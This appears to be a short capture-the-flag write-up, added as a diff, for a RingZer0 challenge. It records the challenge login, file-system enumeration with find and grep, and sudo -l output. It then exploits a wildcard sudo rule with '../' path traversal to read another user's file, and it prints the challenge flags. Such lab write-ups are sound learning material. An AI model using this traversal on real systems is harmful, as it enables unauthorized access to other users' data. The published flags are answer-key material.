@@ -1,0 +1,40 @@
+# User     : ltcastelnuovo
+# Challenge: https://ringzer0ctf.com/challenges/90
+# Objective: Find Neo password
+
+ssh trinity@challenges.ringzer0team.com -p 10090
+pass: Flag-7e0cfcf090a2fe53c97ea3edd3883d0d
+
+1. ssh into server
+2. grep -r "neo" / 2>/dev/null
+3. find / -readable -and -user trinity 2>/dev/null
+3. find / -type f -exec grep -lE 'trinity|neo' {} \; 2>&-
+3. find / -type f -readable ! -empty '(' -user trinity -o -group trinity ')' 2>&-
+
+this didn't show anything special
+
+4. ls -la ~
+this showed a phonebook file
+```
+The Oracle        1800-133-7133
+Persephone        345-555-1244
+
+copy made by Cypher copy utility on /home/neo/phonebook
+```
+
+5. sudo -l
+```
+User trinity may run the following commands on sysadmin-track:
+    (neo) /bin/cat /home/trinity/*
+```
+
+6. sudo -u neo /bin/cat /home/trinity/../neo/phonebook
+```
+The Oracle        1800-133-7133
+Persephone        345-555-1244
+
+change my current password FLAG-314df4d411ae37f16f590f65da99f3b6
+don't forget to remove this :)
+```
+
+FLAG-314df4d411ae37f16f590f65da99f3b6
